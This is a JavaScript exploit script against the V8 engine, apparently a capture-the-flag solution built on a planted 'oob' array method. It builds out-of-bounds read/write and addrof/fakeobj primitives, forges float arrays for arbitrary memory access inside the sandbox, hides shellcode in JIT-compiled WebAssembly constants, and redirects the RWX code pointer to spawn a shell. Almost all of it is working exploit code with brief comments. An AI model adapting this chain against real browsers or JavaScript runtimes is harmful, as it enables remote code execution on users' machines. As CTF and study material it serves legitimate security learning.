var convbuf = new ArrayBuffer(8);
var f64_buf = new Float64Array(convbuf);
var u64_buf = new Uint32Array(convbuf);

function ftoi(val) {
  f64_buf[0] = val;
  return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
  u64_buf[0] = Number(val & 0xffffffffn);
  u64_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}

function hex(x) {
  return `0x${x.toString(16)}`;
}


/* Array for OOB */
var oob = [1.1];
var temp_obj = { A: 1 };
/* Object array used for fakeobj */
var obj_arr = [temp_obj];
/* Array to fake an array (duh) (see read and write funcs) */
var arb_rw_arr = [1.1, 1.2];

/* Trigger the bug, now oob.length == 100 >> 1 */
oob.oob(100);

/* To leak addresses, write to the obj_arr[0] and read from oob[9], the first element of obj_arr.
 * Sandboxed pointer will be in there after writing to obj_arr[0] */
function addrof(obj) {
  obj_arr[0] = obj;
  return ftoi(oob[9]) >> 32n;
}

/* To fake an object, overwrite the first object element of obj_arr with an arbitrary address
 * Then, return the object using obj_arr. This allows in read/write to create a fictitious array from thin air */
function fakeobj(addr) {
  /* keep lower part, metadata */
  const tmp = ftoi(oob[9]) & 0xffffffffn;
  /* overwrite high part, which is the address of the object storted in obj_arr[0] */
  oob[9] = itof(tmp + (addr << 32n));
  return obj_arr[0];
}

/* Yoink the map used for float arrays. This allows to fake a float array ourself! */
var float_map = oob[15];

/* Fake a float array with the address specified in addr. NOTE: this is INSIDE the sandbox!! */
function read(addr) {
  arb_rw_arr[0] = float_map;
  arb_rw_arr[1] = itof(0x0000000200000000n + addr - 0x8n);
  const fake = fakeobj(addrof(arb_rw_arr) - 0x10n);
  return ftoi(fake[0]);
}

/* Fake a float array with the backing set to the address passed. Once faked,  NOTE: this is INSIDE the sandbox!! */
function write(addr, data) {
  arb_rw_arr[0] = float_map;
  arb_rw_arr[1] = itof(0x0000000200000000n + addr - 0x8n);
  const fake = fakeobj(addrof(arb_rw_arr) - 0x10n);
  fake[0] = data;
}

/* The first time you call a function from wasm, v8 jits the wasm code and does NOT call the rwx page
 * However, on the second function call, the wasm code has alreayd been jitted, and modifying the rwx page
 * does work! Here we use the usual code technique, smuggling the shellcode as long sequences of move instructions */
var wasm_code = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 3, 2, 0, 0, 5, 3, 1, 0, 1,
  7, 19, 2, 7, 116, 114, 105, 103, 103, 101, 114, 0, 0, 5, 115, 104, 101, 108,
  108, 0, 1, 10, 99, 2, 3, 0, 1, 11, 93, 0, 65, 0, 66, 212, 188, 197, 249, 143,
  146, 228, 245, 16, 55, 3, 0, 65, 8, 66, 186, 161, 128, 128, 128, 128, 228,
  245, 6, 55, 3, 0, 65, 16, 66, 177, 128, 191, 168, 128, 146, 228, 245, 6, 55,
  3, 0, 65, 24, 66, 184, 247, 128, 128, 128, 128, 228, 245, 6, 55, 3, 0, 65, 32,
  66, 212, 190, 197, 177, 159, 198, 244, 245, 6, 55, 3, 0, 65, 40, 66, 143, 138,
  172, 247, 143, 146, 164, 200, 144, 127, 55, 3, 0, 11,
]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var shell = wasm_instance.exports.shell;
var trigger = wasm_instance.exports.trigger;

/* Trigger jit compiler */
shell();

/* Get address of rwx page, and overwrite it with the offset to our smuggled shellcode */
var addr = addrof(wasm_instance);
var rwx = read(addr + 0x50n);
console.log(hex(rwx));
write(addr + 0x50n, itof(rwx + 0x75dn));

/* Shellcode from @unvariant reads from stdin the command, therefore solve.py sends /bin/sh\x00
 * NOTE: read does not appear to block, send /bin/sh\x00 BEFORE it reads (aka when console.log is executed) */
console.log("SEND");
trigger();

/* Profit! */